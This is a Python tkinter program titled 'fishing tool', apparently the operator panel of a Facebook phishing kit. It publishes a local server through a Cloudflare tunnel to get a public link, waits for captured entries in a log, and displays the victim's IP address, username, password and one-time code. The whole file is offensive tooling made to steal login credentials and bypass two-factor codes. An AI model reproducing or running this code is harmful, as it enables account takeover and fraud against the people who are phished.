from tkinter import *
import os, sys, linecache, time
from tkinter.ttk import *
def sites():
	def fish():
		def linkwindow():
			f = open("process/new.txt")
			copyplace.delete(0, END)
			copyplace.insert(INSERT, f.read())
		link = os.system("cd assets; hostit -f cloudflare 8080 > ../process/link.txt dev/null 2>&1; grep -o 'https://[-0-9a-z]*\.trycloudflare.com' '../process/link.txt' > ../process/new.txt; rm ../process/link.txt")
		def capture():
			file_size = os.path.getsize('assets/log.txt')
			while True:
				new_size=os.path.getsize('assets/log.txt')
				if (new_size > file_size):
					os.system("bash assets/bashscript.sh")
					break
		def uname():
			g= open('process/username.txt', 'r')	 
			unameplace.delete(0, END)
			unameplace.insert(INSERT, g.read())
		def pwget():
			h = open("process/password.txt")
			pwarea.delete(0, END)
			pwarea.insert(INSERT, h.read())
		def otpget():
			i = open("process/otp.txt")
			otparea.delete(0, END)
			otparea.insert(INSERT, i.read())
		def ipfinder():
			j = open("process/ip.txt")
			otparea.delete(0, END)
			ipplace.insert(INSERT, j.read())
		root3 = Tk()
		root3.title("link")
		
		copyplace = Entry(root3, width=60, font="Calibri 10")
		copyplace.grid(row=0,column=2)
		copyplace.insert(INSERT, "click copy link to get link")
		copybutton = Button(root3,text="copy link", command= linkwindow)
		copybutton.grid(row=0, column=0)
		
		listener = Button(root3, text="start capturing", command=capture).grid(row=1,column=0)
	
		ip = Button(root3,text="username", command= ipfinder)
		ip.grid(row=2, column=0)
		ipplace= Entry(root3, width=60, font="Calibri 10")
		ipplace.grid(row=2, column=2)
		ipplace.insert(INSERT, "click ip to update")
		
		username = Button(root3,text="username", command= uname)
		username.grid(row=3, column=0)
		unameplace= Entry(root3, width=60, font="Calibri 10")
		unameplace.grid(row=3, column=2)
		unameplace.insert(INSERT, "click username to update")
		
		pw = Button(root3,text="password", command= pwget)
		pw.grid(row=4, column=0)
		pwarea = Entry(root3, width=60, font="Calibri 10")
		pwarea.grid(row=4,column=2)
		pwarea.insert(INSERT, "click password to update")
		
		otp = Button(root3,text="OTP", command= otpget)
		otp.grid(row=5, column=0)
		otparea = Entry(root3, width=60, font="Calibri 10")
		otparea.grid(row=5,column=2)
		otparea.insert(INSERT, "click OTP to update")
		root3.mainloop()
	root1 = Tk()
	root1.geometry('500x300')
	root1.title("coose option")
	option1 = Button(root1, text = 'Facebook',style = 'W.TButton', command = fish).grid(row = 0, column = 0)
	toolcloser = Button(root1, text = 'Quit !', style = 'W.TButton', command = root1.destroy).grid(row = 0, column = 1)
	root1.mainloop()
os.system("""
#!/bin/bash
if [ -f process/new.txt ]; then
rm process/new.txt
fi
	""")
os.system("""if [ ! -d process ]; then mkdir -p process; fi""")
root = Tk()
root.geometry('300x200')
root.title("fishing tool")
sty = Style()
sty.configure('W.TButton', font = ('calibri', 10, 'bold', 'underline'), foreground = 'red')
btn1 = Button(root, text = 'Click me !', command =sites).grid(row = 0, column = 3, pady = 10, padx = 100)
btn2 = Button(root, text = 'Quit !', style = 'W.TButton', command = root.destroy).grid(row = 1, column = 3, padx = 100)
root.mainloop()
